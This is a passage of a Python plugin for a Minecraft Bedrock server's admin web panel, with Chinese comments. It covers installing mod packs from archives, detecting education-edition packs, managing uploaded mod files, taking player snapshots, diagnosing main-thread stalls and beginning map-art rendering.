                           + "；".join(failed) + " ｜ 已成功：" + out)
                    return False, out
                if notes:
                    out += "（" + "；".join(notes) + "）"
                return True, out
        except Exception as e:
            return False, f"安装失败: {e}"

    # 归档里这些目录永远不是包，直接剪掉：macOS 资源叉、Windows 缩略图缓存，
    # 以及各种包管理/编辑器留下的隐藏目录。
    _ARCHIVE_JUNK_DIRS = ("__MACOSX", "__MACOSX_", ".git", ".svn", ".idea", ".vscode")

    def _discover_packs_in_zip(self, archive, tmp_root):
        """从已解压的归档里找出所有「包」，返回 ``(包列表, 备注列表)``。

        ★ v6.16.40 新增（替代原来的手写 stack 遍历）。

        包列表元素是**目录**（含 manifest.json 的文件夹，原样拷贝）或
        **文件**（嵌套的 .mcpack，需要再解一层）。

        ★ 必须宽容解析：真实世界的 mcaddon 有三种形态，实测（MC Mods Hub
          抽样 3.7 万个包）有 16.8% 的包「扩展名和实际结构对不上」，所以
          不能只认一种：
            A) 归档下挂子文件夹，每个含 manifest.json   ← 中文社区最常见
            B) 归档下挂 .mcpack 文件                    ← 官方规范
            C) 归档根直接就是 manifest.json              ← 不规范但存在
        顺带修掉两个老 bug：
          · 老代码用 ``cur.parent != t_root`` 判断，导致**顶层的直接子目录
            被漏检**（stack 首轮 pop 出来的正是它们），形态 A 全军覆没；
          · 嵌套的 .mcpack 被当成目录塞进候选，走到 copytree 才报
            「File is not a zip file」。
        """
        found = []
        notes = []

        # ---- 形态 C / D：根目录直接就是包（.mcpack 一律走这条）
        if (tmp_root / "manifest.json").is_file():
            return [tmp_root], notes

        def _is_junk(name):
            n = str(name or "")
            return n.startswith(".") or n in self._ARCHIVE_JUNK_DIRS

        for cur, dirs, files in os.walk(str(tmp_root)):
            cur = Path(cur)
            depth = len(cur.relative_to(tmp_root).parts)
            if depth > 6:                      # 防御：畸形归档套娃太深直接剪
                dirs[:] = []
                continue
            # 剪枝：已经识别为包，就不深入它内部找「子包」
            # （包里的 textures/、scripts/ 等子目录都不可能有自己的 manifest）
            if depth > 0 and (cur / "manifest.json").is_file():
                found.append(cur)
                dirs[:] = []
                continue
            dirs[:] = [d for d in dirs if not _is_junk(d)]
            for fn in files:
                if not fn.lower().endswith(".mcpack"):
                    continue
                # 防止把「自己」再解一遍（同名同大小）而不停递归
                cand = cur / fn
                try:
                    if (cand.name.lower() == Path(str(archive)).name.lower()
                            and cand.stat().st_size == Path(str(archive)).stat().st_size):
                        continue
                except Exception:
                    pass
                found.append(cand)

        # 有文件有文件夹时，只用文件夹形态 —— 说明归档是「A+B 混装」，
        # .mcpack 大概率已经被同一层的文件夹覆盖，重复安装会互相覆盖 uuid。
        dirs_only = [p for p in found if p.is_dir()]
        files_only = [p for p in found if p.is_file()]
        if dirs_only and files_only:
            notes.append(f"归档内含 {len(files_only)} 个 .mcpack，已被同层文件夹包覆盖，跳过")
            return dirs_only, notes
        if found:
            return found, notes

        # ---- 兜底：全盘再找一遍 manifest.json（可能藏在很深的子目录里）
        try:
            for p in tmp_root.rglob("manifest.json"):
                parent = p.parent
                if any(part in self._ARCHIVE_JUNK_DIRS or part.startswith(".")
                       for part in parent.relative_to(tmp_root).parts):
                    continue
                found.append(parent)
                dirs[:] = []
                break
        except Exception:
            pass
        if found:
            notes.append("manifest.json 位于深层目录，已按单包安装")
        return found, notes

    def _install_one_pack_folder(self, folder: Path, root: Path, target_type, world_name):
        try:
            m = json.loads((folder / "manifest.json").read_text(encoding="utf-8"))
        except Exception as e:
            return False, f"读取 manifest.json 失败: {e}"
        header = m.get("header", {}) or {}
        uuid_ = header.get("uuid")
        version = header.get("version")
        if not uuid_:
            return False, f"{folder.name} 缺少 header.uuid"
        pack_type = self._pack_type(m)
        if not pack_type:
            return False, f"无法识别包类型: {folder.name}"
        base_dir, world_path = self._resolve_pack_target(root, pack_type, target_type, world_name)
        if base_dir is None:
            return False, f"找不到世界: {world_name}"
        base_dir.mkdir(parents=True, exist_ok=True)
        target_pack = base_dir / str(uuid_)
        if target_pack.exists():
            shutil.rmtree(str(target_pack), ignore_errors=True)
        shutil.copytree(str(folder), str(target_pack))
        self._enable_pack_in_world(world_path, pack_type, uuid_, version)
        return True, f"{header.get('name', folder.name)}（{pack_type}）→ {target_pack}"

    def _install_one_pack_file(self, f: Path, root: Path, target_type, world_name):
        with tempfile.TemporaryDirectory() as td:
            with zipfile.ZipFile(str(f), "r", allowZip64=True) as zf:
                zf.extractall(td)
            t = Path(td)

            found = None
            for item in t.iterdir():
                if item.is_dir() and (item / "manifest.json").exists():
                    found = item
                    break
            if found is None and (t / "manifest.json").exists():
                found = t
            if found is None:
                return False, f"{f.name} 内未找到带 manifest.json 的包"
            return self._install_one_pack_folder(found, root, target_type, world_name)

    @staticmethod
    def _pack_type(m):
        for mod in m.get("modules", []) or []:
            mt = str(mod.get("type", ""))
            if mt == "resources":
                return "resource"
            if mt == "data":
                return "behavior"
        tp = str(m.get("type", "") or "")
        if tp == "resources":
            return "resource"
        if tp == "data":
            return "behavior"
        return None

    # ---- 教育模式包识别 -------------------------------------------------------
    # 教育版的化学模组（元素方块、化合物创建器等）在普通服务器上**装不了、
    # 也不该展示**，但真实模组库里这类包占比很高（很多整合包顺手塞进去）。
    # 判据全部来自 manifest，三路取或：任一路命中即认定。
    #
    # ★ 宁多显示不误杀：判不出来就当普通包，绝不会因为名字里恰好有个相近词
    #   就把玩家的正常模组藏起来。所以下面这些 hint 都是**强特征词**，
    #   "edu" 这种太容易误伤的一律不收。
    _EDU_MODULE_TYPES = ("chemistry",)
    _EDU_NAME_HINTS = (
        "education edition", "minecraft:education", "education_edition",
        "education", "chemistry", "教育版", "教育模式", "化学",
    )

    def _is_education_pack(self, manifest) -> bool:
        """判断一个 manifest 是否属于教育模式（化学）模组。"""
        try:
            m = manifest if isinstance(manifest, dict) else {}
            # 1) 模块类型：chemistry 是教育版专有模块，最硬的判据
            for mod in (m.get("modules") or []):
                if not isinstance(mod, dict):
                    continue
                if str(mod.get("type", "")).strip().lower() in self._EDU_MODULE_TYPES:
                    return True
            header = m.get("header") or {}
            if not isinstance(header, dict):
                header = {}
            # 2) 显式字段
            for key in ("education", "is_education", "education_edition"):
                if m.get(key) or header.get(key):
                    return True
            # 3) 名称 / 描述里的强特征词
            text = " ".join([
                str(header.get("name") or ""),
                str(header.get("description") or ""),
                str(m.get("name") or ""),
            ]).lower()
            for hint in self._EDU_NAME_HINTS:
                if hint in text:
                    return True
            return False
        except Exception:
            # 畸形 manifest 一律不当作教育包：宁可多显示，也不误杀。
            return False

    @staticmethod
    def _read_pack_manifest(pack_dir: Path):
        """读包目录的 manifest.json，失败返回 None（不抛）。"""
        try:
            return json.loads((Path(pack_dir) / "manifest.json").read_text(encoding="utf-8"))
        except Exception:
            return None

    def _resolve_pack_target(self, root: Path, pack_type, target_type, world_name):
        sub = "resource_packs" if pack_type == "resource" else "behavior_packs"
        if target_type != "world":
            return root / sub, self._locate_world_for_target(root)
        wpath = self._locate_world(root, world_name)
        if wpath is None:
            return None, None
        return wpath / sub, wpath

    def _locate_world_for_target(self, root):

        try:
            _, content = self._read_properties_raw()
            name = self._get_property_value(content, "level-name")
            if name:
                w = self._locate_world(root, name)
                if w:
                    return w
        except Exception:
            pass
        return None

    def _locate_world(self, root, world_name):
        name = str(world_name or "").strip()
        cands = []
        if name:
            cands = [root / "worlds" / name, root / name]
        else:
            return None
        for c in cands:
            try:
                if c.is_dir() and (c / "level.dat").exists():
                    return c
            except Exception:
                pass
        return None

    def _enable_pack_in_world(self, world_path, pack_type, uuid_, version):

        if world_path is None:
            return
        jf = world_path / ("world_resource_packs.json" if pack_type == "resource" else "world_behavior_packs.json")
        entries = []
        try:
            if jf.exists():
                entries = json.loads(jf.read_text(encoding="utf-8"))
                if not isinstance(entries, list):
                    entries = []
        except Exception:
            entries = []
        found = False
        for e in entries:
            if e.get("pack_id") == uuid_:
                e["version"] = version
                found = True
                break
        if not found:
            entries.append({"pack_id": uuid_, "version": version})
        # 原子写入 + 备份：这个文件写坏会让该存档**所有模组失效、玩家进不去**，
        # 且原来失败是静默吞掉的（用户只会发现世界打不开，查不到原因）。
        # 与 _write_world_packs 保持一致的 .bak 备份策略。
        ok = atomic_write_json(jf, entries, indent=2, backup=True)
        if not ok:
            self.logger.error(
                f"[模组] 写入 {jf.name} 失败，世界的模组启用状态可能未生效：{jf}"
            )

    def _list_mod_uploaded(self):
        """上传库里可安装的包 = 网页上传（注册表） + 手动投放（inbox 实时扫描）。

        ★ inbox 必须**实时扫描**而不能只读注册表：用户是用文件管理器把文件
        拷进去的，我们没有任何机会登记它。老代码只读 mod_registry.json，
        结果手动放进去的文件在界面里根本不出现。
        """
        r = self._load_mod_registry()
        mods = r.get("mods", [])
        out = []
        seen = set()
        for it in mods:
            fname = it.get("file", "")
            if not fname:
                continue
            seen.add(str(fname))
            fpath = self._mods_dir() / fname
            out.append({
                "file": fname,
                # 旧版本清单没有 display 字段，此时退回磁盘名，界面不会缺字。
                "name": it.get("display") or fname,
                "size": it.get("size", 0),
                "exists": fpath.is_file(),
                "uploaded": it.get("uploaded", ""),
                "source": "upload",
            })
        # inbox 条目排在前面：用户刚拷进去的，最可能是他现在想装的。
        for it in self._scan_mods_inbox():
            if str(it.get("file")) in seen:
                continue          # 同名的以注册表为准（可能正在被安装流程占用）
            seen.add(str(it.get("file")))
            out.insert(0, it)
        return out

    def _find_mod_source(self, fname):
        """定位一个模组包的磁盘路径：先找上传库，再找 inbox。

        返回 ``(Path, source)``，找不到返回 ``(None, "")``。
        安装 / 删除都必须用这个函数定位，否则 inbox 里的文件永远装不上、
        也删不掉（老代码写死了 ``_mods_dir() / name``）。
        """
        safe = os.path.basename(str(fname or "").strip())
        if not safe:
            return None, ""
        p = self._mods_dir() / safe
        try:
            if p.is_file():
                return p, "upload"
        except Exception:
            pass
        p2 = self._mods_inbox_dir() / safe
        try:
            if p2.is_file():
                return p2, "inbox"
        except Exception:
            pass
        return None, ""

    def _delete_mod_file(self, fname):
        """从上传库或 inbox 里删掉一个包。inbox 里的同时清掉注册表残留。"""
        safe = os.path.basename(str(fname or "").strip())
        if not safe:
            return False
        if os.path.basename(safe) != safe:
            return False
        removed = False
        for base in (self._mods_dir(), self._mods_inbox_dir()):
            try:
                fp = base / safe
                if fp.is_file():
                    fp.unlink()
                    removed = True
            except Exception:
                pass
        # 无论删的是哪边，都把注册表里的同名条目清掉：
        # 手动往 inbox 丢一个与上传文件同名的包时，注册表那条会变成幽灵。
        try:
            with self._store_lock():
                r = self._load_mod_registry()
                kept = [it for it in r.get("mods", []) if it.get("file") != safe]
                if len(kept) != len(r.get("mods", [])):
                    r["mods"] = kept
                    self._json_save("mods/mod_registry.json", r)
        except Exception:
            pass
        return removed

    def _cleanup_installed_source(self, fname):
        """安装成功后清掉源安装包，让它从「待安装」列表里消失。

        返回 ``(是否删掉了文件, 说明文字)``。

        ★ 为什么要单独一个方法
        ----------------------
        安装成功后源文件必须消失，否则用户刷新后**又看到同一个包**，
        分不清到底装没装过 —— 这正是本轮修复的 bug。

        老代码把清理写在 ``web.py`` 的安装线程里，而且只认 inbox：

            inbox_file = src if source == "inbox" else None
            if ok and inbox_file is not None:
                inbox_file.unlink()

        ``source`` 是 ``upload``（网页上传，**主路径**）时拿到 ``None``，
        整段清理被跳过 —— 上传的包装完后永远留在列表里。
        这里把「删文件 + 清注册表」收敛成一个入口，两种来源一视同仁，
        免得以后又有人在某条分支上漏掉。

        ⚠ 只在**安装确认成功**后调用。失败要留文件让用户修正后重试。
        """
        if not fname:
            return False, "未提供文件名"
        # 复用 _delete_mod_file：它已经同时处理 _mods_dir() 与 inbox
        # 两处，并且会摘掉注册表里的同名条目（避免幽灵项）。这里再写一份
        # 等价逻辑只会让两边慢慢长歪。
        try:
            removed = self._delete_mod_file(fname)
        except Exception as e:
            return False, f"清理源文件失败: {e}"
        if removed:
            return True, "已从待安装列表移除"
        return False, "源文件已不在磁盘上（可能已被清理）"

    def _run_server(self):
        try:
            self.httpd.serve_forever()
        except Exception as e:
            self.logger.error(f"Web 服务器异常: {e}")
            traceback.print_exc()

    def _snapshot(self):
        if self._periodic_stopped:
            return

        players: List[Dict[str, Any]] = []
        objective_names: List[str] = []
        objectives: List[Dict[str, Any]] = []
        player_bans: List[Dict[str, Any]] = []
        ip_bans: List[Dict[str, Any]] = []
        try:
            scoreboard = self.server.scoreboard
            if scoreboard:
                for obj in scoreboard.objectives:
                    try:
                        objective_names.append(obj.name)
                        slot = obj.display_slot
                        objectives.append({
                            "name": obj.name,
                            "display_name": obj.display_name,
                            "display_slot": slot.name if slot is not None else None,
                            "render_type": getattr(obj.render_type, "name", None) or str(obj.render_type),
                            "sort_order": obj.sort_order.name if obj.sort_order is not None else None,
                            "is_displayed": bool(obj.is_displayed),
                        })
                    except Exception:
                        continue

            try:
                for entry in self.server.ban_list.entries:
                    player_bans.append({
                        "name": entry.name,
                        "uuid": str(entry.unique_id) if entry.unique_id else None,
                        "xuid": entry.xuid,
                        "reason": entry.reason,
                        "source": entry.source,
                        "created": entry.created.isoformat() if entry.created else None,
                        "expiration": entry.expiration.isoformat() if entry.expiration else None,
                    })
            except Exception:
                pass
            try:
                for entry in self.server.ip_ban_list.entries:
                    ip_bans.append({
                        "address": entry.address,
                        "reason": entry.reason,
                        "source": entry.source,
                        "created": entry.created.isoformat() if entry.created else None,
                        "expiration": entry.expiration.isoformat() if entry.expiration else None,
                    })
            except Exception:
                pass

            for player in self.server.online_players:
                try:
                    loc = player.location
                    dimension = loc.dimension.name if hasattr(loc, "dimension") else "unknown"
                    tags = list(player.scoreboard_tags) if hasattr(player, "scoreboard_tags") else []
                    scores: Dict[str, int] = {}
                    if scoreboard:
                        for objective in scoreboard.objectives:
                            try:
                                score = objective.get_score(player)
                                if score is not None and score.is_score_set:
                                    scores[objective.name] = score.value
                            except Exception:
                                continue
                    permissions: List[Dict[str, Any]] = []
                    try:
                        for info in player.effective_permissions:
                            permissions.append({"permission": info.permission, "value": bool(info.value)})
                    except Exception:
                        pass
                    try:
                        perm_level = int(player.permission_level)
                    except Exception:
                        perm_level = 0
                    try:
                        uid = str(player.unique_id) if player.unique_id is not None else ""
                    except Exception:
                        uid = ""
                    try:
                        xuid = str(player.xuid) if getattr(player, "xuid", None) else ""
                    except Exception:
                        xuid = ""
                    players.append({
                        "name": player.name,
                        "uuid": uid,
                        "xuid": xuid,
                        "x": loc.x,
                        "y": loc.y,
                        "z": loc.z,
                        "dimension": dimension,
                        "health": player.health,
                        "max_health": player.max_health,
                        "ping": getattr(player, "ping", 0),
                        "game_mode": str(player.game_mode) if hasattr(player, "game_mode") else "unknown",
                        "is_op": player.is_op if hasattr(player, "is_op") else False,
                        "tags": tags,
                        "scores": scores,
                        "permissions": permissions,
                        "permission_level": perm_level,
                    })
                except Exception:
                    continue
        except Exception as e:
            self.logger.error(f"刷新玩家快照出错: {e}")
        with self._cache_lock:
            self._cache = {
                "players": players,
                "objective_names": objective_names,
                "objectives": objectives,
                "player_bans": player_bans,
                "ip_bans": ip_bans,
            }

    def _get_cache(self) -> Dict[str, Any]:
        with self._cache_lock:
            return self._cache

    def _get_cached_player(self, name: str):
        cache = self._get_cache()
        for p in cache.get("players", []):
            if p.get("name") == name:
                return p
        return None

    def _diag_on(self):
        try:
            return bool(self._diag_cfg.get("enabled", True))
        except Exception:
            return True

    def _diag_verbose(self):
        try:
            return bool(self._diag_cfg.get("detailed", True))
        except Exception:
            return True

    #: 面板日志缓冲的级别序。数字越大越重要，用于阈值比较。
    _PANEL_LEVEL_RANK = {"trace": 0, "debug": 1, "info": 2,
                         "warning": 3, "error": 4, "critical": 5}

    #: ``on_disable()`` 时置 True，让所有周期性任务立刻短路。
    #: 类级默认值保证「插件还没 on_enable / 已 on_disable」时也能安全读到
    #: （这类"实例属性缺省"是本插件反复踩的坑，见 on_enable 的注释）。
    _periodic_stopped = False

    def _panel_min_level(self):
        """面板日志缓冲的**最低级别**（小写）。

        ★ 为什么要单独一个方法、而不是直接读一个配置项
        --------------------------------------------
        "平时少打日志、诊断时全打"有两个入口（诊断页的「详细日志」复选框，
        以及新增的级别下拉），两者要能叠加、且要有明确的优先级，否则
        用户会遇到"我明明关了详细日志，怎么还有 INFO 在刷"的自相矛盾。
        收口在这里，两个日志写入点（``_PanelLoggerAdapter._emit`` 和
        ``_PanelLogHandler.emit``）共用同一套判定。

        优先级（高 → 低）::

            1. 诊断页级别下拉（``_diag_cfg["min_level"]``，显式选择优先）
            2. 「详细日志」复选框（``_diag_cfg["detailed"]``，默认 True）
                 - 开 → info   （保持升级前后的观感一致，不突然变吵）
                 - 关 → warning（平时只留值得注意的）
            3. 兜底 info

        ⚠ 默认必须是 **info**。``_diag_verbose()`` 的历史默认是 True，
        若这里默认成 warning，用户升级后会突然"日志变少了"却找不到原因。
        """
        try:
            lv = str(self._diag_cfg.get("min_level") or "").strip().lower()
            if lv in self._PANEL_LEVEL_RANK:
                return lv
            return "info" if self._diag_verbose() else "warning"
        except Exception:
            return "info"

    def _panel_log_wanted(self, level) -> bool:
        """这条级别的日志是否要进**面板缓冲**。

        ★ 只影响面板的内存缓冲，**绝不影响** ``latest.log`` 与控制台。
          落盘日志是事后排障的唯一凭据，任何过滤都不该动它。

        ★ 兜底方向是**放行**（返回 True）。过滤逻辑本身出问题时宁可多显示，
          也不能因为一个异常让面板"什么都看不到"——那会让用户以为插件坏了。
        """
        try:
            cur = self._PANEL_LEVEL_RANK.get(str(level).lower(), 2)
            floor = self._PANEL_LEVEL_RANK.get(self._panel_min_level(), 2)
            return cur >= floor
        except Exception:
            return True

    def _diag_save_cfg(self):
        try:
            self.data_dir.mkdir(parents=True, exist_ok=True)
            if not atomic_write_json(self._diag_cfg_path, self._diag_cfg, indent=2):
                raise RuntimeError("原子写入失败")
            return True
        except Exception as e:
            self.logger.error(f"[诊断] 保存诊断设置失败: {e}")
            return False

    def _tick_health(self):
        if self._periodic_stopped:
            return

        if not self._diag_on():
            return
        now = time.monotonic()
        try:
            with self._tick_lock:
                gap = (now - self._tick_prev) * 1000.0
                self._tick_prev = now
                self._tick_gap_ms = gap
            if gap > 500.0:
                with self._tick_lock:
                    self._tick_slow_count += 1
                    alert = now - self._tick_alert_last
                if alert > 15.0:
                    with self._tick_lock:
                        self._tick_alert_last = now
                    self._log_diag("tick_slow", {"gap_ms": round(gap, 1), "current": self._pt_current_name(), "pending": self._pt_pending})
                    if not self._diag_verbose():
                        return
                    cur = self._pt_current_name()
                    hint = ""
                    if not cur:
                        hint = "（当前无插件任务占用主线程，多为世界自动保存/区块生成/实体加载等游戏核心耗时）"
                    else:
                        hint = f"（当前主线程正执行插件任务：{cur}）"
                    self.logger.warning(f"[诊断] 主线程 tick 间隔异常偏大: {gap:.1f}ms（正常约50ms）；当前任务={cur} 排队={self._pt_pending}{hint}")
                    if gap > 2000.0:
                        self._alert_main_stuck(gap, cur)
        except Exception:
            pass

    def _pt_current_name(self):
        try:
            with self._pt_lock:
                if not self._pt_current:
                    return None
                return self._pt_current.get("name")
        except Exception:
            return None

    def _pt_mark_begin(self, name, args):
        try:
            with self._pt_lock:
                self._pt_pending += 1
                if self._pt_current is None:
                    self._pt_current = {"name": name, "args": args, "t0": time.monotonic()}
                    return True
            return False
        except Exception:
            return False

    def _pt_mark_end(self):
        try:
            with self._pt_lock:
                self._pt_pending -= 1
                if self._pt_pending < 0:
                    self._pt_pending = 0
                self._pt_current = None
        except Exception:
            pass

    def _alert_main_stuck(self, gap: float, cur) -> None:
        """主线程疑似卡死时的**精简版**告警。

        ★ 为什么不再无条件 dump 全部线程栈
        ------------------------------------
        旧实现把 ``threading.enumerate()`` 里**每个**线程的 18 层栈都打出来，
        实际刷了 90+ 行。但那些线程绝大多数正在**合法地等待**：
        ``queue.get()``、``Event.wait()``、``selector.poll()``、线程池空转 ——
        它们跟"主线程卡死"毫无关系，纯噪音。日志被淹之后，真正有用的那一帧
        反而被埋掉了。

        新策略：
          ① **只保留可疑线程** —— 跳过已知的空转/等待线程；
          ② 栈深度 18 → 10，并剪掉 ``_bootstrap`` 样板帧；
          ③ **同一份栈 60 秒内不重复输出**（卡死常持续，同一份栈刷 N 遍无意义）；
          ④ 总行数硬上限，线程再多也不会淹日志。
        """
        try:
            # ---- ③ 去重：栈指纹 60 秒内不变就跳过 ----
            stacks = self._collect_stacks()
            fp = hash(stacks.get("main", "") + "|" + "|".join(
                sorted(stacks.get("others", []))))
            now = time.monotonic()
            last_fp = getattr(self, "_stuck_fp", None)
            last_ts = getattr(self, "_stuck_ts", 0.0)
            if fp == last_fp and (now - last_ts) < 60.0:
                return          # 同一现场，已经报过了
            self._stuck_fp = fp
            self._stuck_ts = now

            lines = []
            main_stack = stacks.get("main", "")
            if main_stack:
                lines.append(f"[诊断] 主线程（{gap:.0f}ms 未 tick）栈：")
                lines.append(main_stack)
            else:
                lines.append(f"[诊断] 主线程 {gap:.0f}ms 未 tick"
                             f"（未能取到栈，可能是解释器正在 GC/扩栈）")

            busy = stacks.get("others", [])
            if busy:
                lines.append(f"[诊断] 同期在跑的插件线程（{len(busy)} 个）：")
                lines.extend(busy)

            self.logger.warning("\n".join(lines))
        except Exception:
            pass

    def _collect_stacks(self) -> Dict[str, Any]:
        """收集线程栈，**只保留有价值的**。

        返回 ``{"main": 主线程栈文本, "others": [其它可疑线程栈, ...]}``。

        过滤规则（这是把 90 行降到个位数的关键）：
          · 主线程 —— 永远保留，它是我们关心的问题所在；
          · 其它线程 —— 先看**最内层帧**，命中"正在等队列 / 等事件 / poll /
            空转线程池"的一律丢弃；
          · 剩下的按"栈里是否出现本插件文件路径"排序，插件线程优先。
        """
        try:
            cur = sys._current_frames()
        except Exception:
            return {"main": "", "others": []}

        main_id = getattr(self, "_main_thread_id", None)

        # 已知的"合法等待"特征 —— 命中即视为噪音，不输出。
        #
        # 为什么判断规则要分两层（这是踩过坑才写出来的）
        # ---------------------------------------------
        # 阻塞线程的栈有两种形态：
        #
        #   ① 阻塞在**有 Python 帧**的调用上（queue.get / Event.wait /
        #      selector.poll）。栈形如：
        #          wait  → get  → qw  → run → _bootstrap
        #      这种直接看栈里有没有 wait/get/poll 这些名字即可。
        #
        #   ② 阻塞在**纯 C 调用**上（time.sleep / 文件 read / 锁 acquire）。
        #      C 调用在 Python 帧栈里**不留记录** ——
        #          sl  → run → _bootstrap_inner → _bootstrap
        #      栈上完全看不出它在睡。
        #
        # ★ 为什么第②类**不**过滤掉
        # -------------------------
        # 试过用"业务帧 ≤1 就是阻塞"来杀它，但这样会**误杀真在干活的线程**：
        #     def busy():          def sl():
        #         while n<1e8:         for _ in range(500):
        #             n += 1               time.sleep(0.01)
        # 两者的 Python 帧栈**一模一样**（都是单帧），区分它们只能去反编译
        # 字节码看有没有 LOAD_GLOBAL sleep —— 为了一条背景信息做这种精度
        # 不值得，而且漏报真凶的代价远大于多打两行。
        #
        # 所以：只过滤第①类（有明确等待帧的），第②类保留 ——
        # 反正后面有"最多 3 个线程"的硬上限兜底，不会淹日志。
        _IDLE_NAMES = ("wait", "get", "acquire", "join", "select",
                       "poll", "serve_forever", "accept",
                       "wait_for", "run_forever", "recv")

        def _is_idle(frame) -> bool:
            try:
                f = frame
                depth = 0
                while f is not None and depth < 12:
                    code = f.f_code
                    name = code.co_name
                    fname = code.co_filename or ""
                    if name in _IDLE_NAMES:
                        return True
                    if "concurrent/futures/thread.py" in fname and \
                            name == "_worker":
                        return True
                    if "asyncio/base_events.py" in fname:
                        return True
                    if "selectors.py" in fname:
                        return True
                    f = f.f_back
                    depth += 1
                return False
            except Exception:
                return False

        def _fmt(frame, extra: str = "") -> str:
            try:
                parts = []
                # 剪掉 threading._bootstrap / _bootstrap_inner / run 三层样板，
                # 它们在任何线程栈里都长得一样，占 3 行却零信息量。
                stack = traceback.extract_stack(frame, limit=10)
                skip = ("_bootstrap_inner", "_bootstrap", "run")
                for fr in stack:
                    if fr.name in skip and "threading.py" in (fr.filename or ""):
                        continue
                    parts.append("  %s:%s in %s\n" %
                                 (fr.filename, fr.lineno, fr.name))
                head = f"---- 线程 {extra} ----\n"
                return head + "".join(parts) if parts else ""
            except Exception:
                return ""

        main_stack = ""
        others = []
        try:
            for th in threading.enumerate():
                fr = cur.get(th.ident)
                if fr is None:
                    continue
                if main_id is not None and th.ident == main_id:
                    main_stack = _fmt(fr, f"{th.name} <<主线程>>")
                    continue
                if th.ident == threading.current_thread().ident:
                    continue                      # 不要 dump 诊断线程自己
                # 主线程之外的：跳过合法等待者
                if _is_idle(fr):
                    continue
                txt = _fmt(fr, f"{th.name} (id={th.ident})")
                if txt:
                    others.append(txt)
        except Exception:
            pass

        # 插件线程优先（栈里带 admin_web 路径的更可能是肇事者）
        def _prio(t):
            return (0 if "admin_web" in t else 1)

        others.sort(key=_prio)
        # ④ 硬上限：最多 3 个其它线程，每个约 10 行，加上主线程 ≈ 40 行封顶
        return {"main": main_stack, "others": others[:3]}

    def _dump_all_stacks(self) -> str:
        """全线程栈转储（**仅诊断页手动触发时使用**）。

        ⚠ 自动告警路径不要用这个 —— 那个会刷 90+ 行。
          自动告警走 ``_alert_main_stuck()``，只挑可疑线程。
          这里保留全量版本，是因为服主在诊断页主动点"导出现场"时，
          他**就是要**完整信息，这时候少给反而是失职。
        """

        import io as _io
        try:
            cur = sys._current_frames()
        except Exception:
            return "(无法获取线程栈)"
        buf = _io.StringIO()
        try:
            for th in threading.enumerate():
                fr = cur.get(th.ident)
                if fr is None:
                    continue
                is_main = (th.ident == getattr(self, "_main_thread_id", None))
                buf.write("---- 线程: %s (id=%s)%s ----\n"
                          % (th.name, th.ident, " <<主线程>>" if is_main else " <<HTTP/后台>>" if "HTTP" in th.name else ""))
                try:
                    buf.write("".join(traceback.format_stack(fr, limit=18)))
                except Exception:
                    buf.write("(栈解析失败)")
                buf.write("\n")
            return buf.getvalue()
        except Exception as e:
            return f"(栈转储异常: {e})"

    def _log_diag(self, kind: str, extra: Optional[dict] = None):
        try:
            item = {"kind": kind, "ts": time.strftime("%H:%M:%S"), "extra": extra or {}}
            self._diag_events.append(item)
        except Exception:
            pass

    def _diag_summary(self) -> Dict[str, Any]:
        """诊断汇总（供面板"诊断"页与 /api/diag 使用）。

        ★ v6.16.39 新增 data_dir / log_* 字段
        --------------------------------------
        用户反馈"日志写入错误"时，此前面板上看不到任何线索 —— 因为
        数据目录解析失败、日志初始化失败都被静默吞掉了。现在把这些
        状态一并透出，前端会以 ★★★ 前缀显示在最上方。

        字段含义：
          data_dir        实际生效的数据目录（用户可据此去磁盘上找文件）
          data_dir_error  解析 data_folder 失败的原因（上游根因）
          log_path        日志文件的实际落盘路径（None = 未启用）
          log_error       日志未能启用/写入的原因
          packaging_error 打包发行名不合规的提示（data_folder 拿不到的上游原因）

        ⚠ 全部用 ``getattr``：本方法会被测试用 ast 抽取到"假宿主"上运行，
        假宿主不一定有这些属性。
        """
        try:
            with self._tick_lock:
                gap = self._tick_gap_ms
                slow = self._tick_slow_count

            _handler = getattr(self, "_plugin_log_handler", None)
            _log_path = None
            if _handler is not None:
                try:
                    _log_path = str(getattr(_handler, "baseFilename", "") or "") or None
                except Exception:
                    _log_path = None

            return {
                "tick_gap_ms": round(gap, 1),
                "tick_slow_count": slow,
                "pending": self._pt_pending,
                "current": self._pt_current_name(),
                "main_thread_id": getattr(self, "_main_thread_id", None),
                "enabled": self._diag_on(),
                "detailed": self._diag_verbose(),
                # 面板日志缓冲当前生效的最低级别（前端下拉回填用）。
                # 用 getattr 兜底：本方法会被测试用 ast 抽到"假宿主"上跑。
                "min_level": (self._panel_min_level()
                              if callable(getattr(self, "_panel_min_level", None))
                              else "info"),
                "events": list(self._diag_events),
                "backup_running": bool(self._backup_state.get("running")),
                "backup_next_run": self._backup_state.get("next_run"),
                "cloud_cfg": self._cloud_cfg_raw(),
                # ---- 数据目录 / 日志状态（本轮新增）----
                "data_dir": str(getattr(self, "data_dir", "") or ""),
                "data_dir_error": getattr(self, "_data_dir_error", None),
                "log_path": _log_path,
                "log_error": getattr(self, "_log_error", None),
                "packaging_error": getattr(self, "_packaging_error", None),
            }
        except Exception as e:
            return {"error": str(e)}


    # ------------------------------------------------------------ 地图画

    def _execute_map(self, player_name: str, image_data: bytes):
        """把一张 128×128 的 24 位无压缩 BMP 画成地图并发放给玩家。

        返回 ``(是否成功, 说明文字)``。

        这是**主插件侧的权威实现**，供两条路径共用：
          * Web 面板「地图画」上传（``web.py`` 的 handler 调它）
          * 子插件通过 ``gm.mapart.give()`` 调用（``gm/mapart.py`` 调它）

        ⚠ 历史 bug（已修）：本方法原先只定义在 ``web.AdminHTTPHandler``
        **这个 HTTP 处理器类**上。面板自己调得到，但 ``gm/mapart.py`` 里
        写的是 ``plugin._execute_map(...)`` —— 插件对象上根本没有这个方法，
        于是子插件一调用就炸：

            ❌ 生成失败：生成地图失败:
               'GreenMoonPlugin' object has no attribute '_execute_map'

        修复方式是把实现搬到插件类上（所有权本就该在插件侧：它要碰
        server / scheduler / 玩家背包），web 那边改为转发调用，避免两套
        逻辑各自演化。

        调用方需要自己保证在主线程执行 —— ``gm/_sched.py`` 的
        ``call()`` 已做这一步调度。
        """
        try:
            target = self.server.get_player(player_name)
        except Exception as e:
            return False, f"查询玩家失败: {e}"
        if not target:
            return False, f"玩家 {player_name} 不在线"

        try:
            pixels = decode_bmp_24bit(image_data)
        except Exception as e:
            return False, f"图片解码失败: {e}"

        try:
            dimension = target.dimension
        except AttributeError:
            try:
                dimension = target.location.dimension
            except AttributeError:
                return False, "无法获取玩家所在维度"

        try:
            map_view = self.server.create_map(dimension)
        except TypeError:
            # 老版本 endstone 的 create_map() 不接受 dimension 参数
            try:
                map_view = self.server.create_map()
            except Exception:
